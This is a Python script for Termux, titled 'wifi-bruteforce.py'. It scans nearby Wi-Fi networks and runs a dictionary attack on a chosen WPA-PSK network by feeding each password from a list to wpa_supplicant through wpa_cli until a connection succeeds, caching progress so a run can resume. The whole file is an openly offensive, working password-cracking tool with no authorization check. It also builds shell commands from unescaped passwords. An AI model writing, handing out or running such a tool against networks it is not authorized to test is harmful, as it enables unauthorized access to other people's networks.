#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
wifi-bruteforce.py
High-reliability, managed-mode-only WPA-PSK brute-forcer for Termux.
NO monitor mode, NO aircrack-ng, NO external binaries beyond stock wpa_supplicant.
"""

from __future__ import annotations

import argparse
import contextlib
import json
import os
import signal
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from typing import Dict, List, Optional

try:
    from tqdm import tqdm  # type: ignore
except ImportError:
    tqdm = None  # fallback

# ---------------------------------------------------------------------------
# CONSTANTS
# ---------------------------------------------------------------------------
CACHE_FILE = Path.home() / ".wifi-bruteforce.cache.json"
DEFAULT_DICT = Path(__file__).with_suffix(".txt")  # same folder
DEFAULT_IFACE = "wlan0"
POLL_INTERVAL = 1.0  # second
MAX_CONNECT_TIME = 4  # seconds per password
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# UTILITIES
# ---------------------------------------------------------------------------
class BruteError(RuntimeError):
    pass


def sh(cmd: str, *, check: bool = True, capture: bool = True) -> Optional[str]:
    """Shell helper with UTF-8 safe output."""
    try:
        cp = subprocess.run(
            cmd,
            shell=True,
            capture_output=capture,
            text=True,
            encoding="utf-8",
            check=check,
        )
        return cp.stdout.strip() if capture else None
    except subprocess.CalledProcessError as e:
        if check:
            raise BruteError(f"Command failed: {cmd}\n{e.stderr}") from e
        return None


# ---------------------------------------------------------------------------
# PRIVILEGE & INTERFACE
# ---------------------------------------------------------------------------
def require_root() -> None:
    if os.geteuid() != 0:
        raise BruteError("Must run under root (tsu / su) for ioctl & wpa_supplicant.")


def detect_iface() -> str:
    """Return first wireless interface whose type is managed."""
    for path in Path("/sys/class/net").glob("*"):
        if not path.is_dir():
            continue
        iface = path.name
        type_path = path / "type"
        if not type_path.exists():
            continue
        try:
            if int(type_path.read_text().strip()) == 1:
                return iface
        except ValueError:
            continue
    raise BruteError("No managed wireless interface found.")


# ---------------------------------------------------------------------------
# SCAN
# ---------------------------------------------------------------------------
def scan_networks(iface: str) -> Dict[str, List[str]]:
    """Return {ssid: [list of BSSIDs]} in range."""
    raw = sh(f"iwlist {iface} scan")
    if not raw:
        raise BruteError("Scan failed – is Wi-Fi enabled?")
    networks: Dict[str, List[str]] = {}
    current_ssid = None
    for line in raw.splitlines():
        line = line.strip()
        if "ESSID:" in line:
            essid = line.split('"', 2)[1]
            if essid:  # skip hidden
                networks.setdefault(essid, [])
                current_ssid = essid
        elif "Address:" in line and current_ssid is not None:
            bssid = line.split()[1]
            networks[current_ssid].append(bssid)
    return networks


# ---------------------------------------------------------------------------
# PASSWORD DICT
# ---------------------------------------------------------------------------
def load_dict(path: Path) -> List[str]:
    if not path.is_file():
        raise BruteError(f"Dictionary not found: {path}")
    with path.open(encoding="utf-8") as fh:
        return [line.strip() for line in fh if line.strip()]


# ---------------------------------------------------------------------------
# WPA CONNECTION TEST
# ---------------------------------------------------------------------------
@contextlib.contextmanager
def wpa_ctrl(iface: str):
    """
    Context manager that starts wpa_supplicant *once* per SSID
    and shuts it down gracefully.
    """
    cmd = f"wpa_supplicant -B -i {iface} -c /dev/null -C /data/local/tmp/wpa_ctrl"
    sh(cmd)
    try:
        yield
    finally:
        sh("pkill wpa_supplicant", check=False)


def test_password(iface: str, ssid: str, pwd: str) -> bool:
    """Return True if pwd unlocks ssid."""
    idx = sh(f"wpa_cli -i {iface} add_network")
    if idx is None:
        return False
    try:
        sh(f'wpa_cli -i {iface} set_network {idx} ssid \'"{ssid}"\'')
        sh(f'wpa_cli -i {iface} set_network {idx} psk \'"{pwd}"\'')
        sh(f"wpa_cli -i {iface} select_network {idx}")
        deadline = time.time() + MAX_CONNECT_TIME
        while time.time() < deadline:
            st = sh(f"wpa_cli -i {iface} status", check=False)
            if st and "wpa_state=COMPLETED" in st:
                return True
            time.sleep(POLL_INTERVAL)
        return False
    finally:
        sh(f"wpa_cli -i {iface} remove_network {idx}", check=False)


# ---------------------------------------------------------------------------
# CACHE / RESUME
# ---------------------------------------------------------------------------
def load_cache() -> Dict[str, int]:
    if not CACHE_FILE.exists():
        return {}
    try:
        return json.loads(CACHE_FILE.read_text())
    except Exception:
        return {}


def save_cache(cache: Dict[str, int]) -> None:
    CACHE_FILE.write_text(json.dumps(cache))


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Managed-mode WPA-PSK brute-forcer")
    p.add_argument("-i", "--iface", default=DEFAULT_IFACE, help="wireless interface")
    p.add_argument("-d", "--dict", type=Path, default=DEFAULT_DICT, help="password list")
    p.add_argument("-s", "--ssid", help="target SSID (omit to list)")
    p.add_argument("-q", "--quick", action="store_true", help="skip DHCP wait")
    p.add_argument("--resume", action="store_true", help="continue from cache")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    require_root()
    iface = args.iface if args.iface != DEFAULT_IFACE else detect_iface()

    networks = scan_networks(iface)
    if not networks:
        raise BruteError("No networks found.")

    if not args.ssid:
        print("Networks in range:")
        for n, (ssid, bss) in enumerate(networks.items(), 1):
            print(f"  {n:2d}  {ssid}  ({len(bss)} APs)")
        return

    ssid = args.ssid
    if ssid not in networks:
        raise BruteError(f"SSID '{ssid}' not found.")

    passwords = load_dict(args.dict)
    if not passwords:
        raise BruteError("Empty dictionary.")

    cache = load_cache() if args.resume else {}
    start = cache.get(ssid, 0)
    passwords = passwords[start:]

    print(f"Testing {len(passwords)} passwords for '{ssid}' starting at idx={start}")
    bar = tqdm if tqdm else lambda x, **kw: x
    with wpa_ctrl(iface):
        for idx, pwd in bar(enumerate(passwords, start=start), total=len(passwords)):
            if test_password(iface, ssid, pwd):
                print(f"\n[+] SUCCESS: {pwd}")
                cache.pop(ssid, None)
                save_cache(cache)
                return
            cache[ssid] = idx + 1
            if idx % 10 == 0:  # reduce I/O
                save_cache(cache)
    save_cache(cache)
    print("\n[-] Exhausted dictionary.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAborted by user.")
    except BruteError as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)